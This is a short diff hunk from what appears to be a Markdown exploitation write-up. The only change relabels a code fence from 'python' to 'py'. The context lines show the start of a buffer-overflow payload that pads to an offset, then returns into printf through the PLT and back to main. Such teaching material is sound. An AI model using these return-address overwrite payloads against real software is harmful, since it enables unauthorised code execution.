@@ -69,7 +69,7 @@ So, we can overwrite the return address and call system function now, but how do
 
 ## Exploit writing
 
-```python
+```py
 payload = b"A" * offset
 payload += p32(exe.plt.printf)  # Calling the PLT of printf is the same as calling the function directly
 payload += p32(exe.sym.main)   # Return to main after done
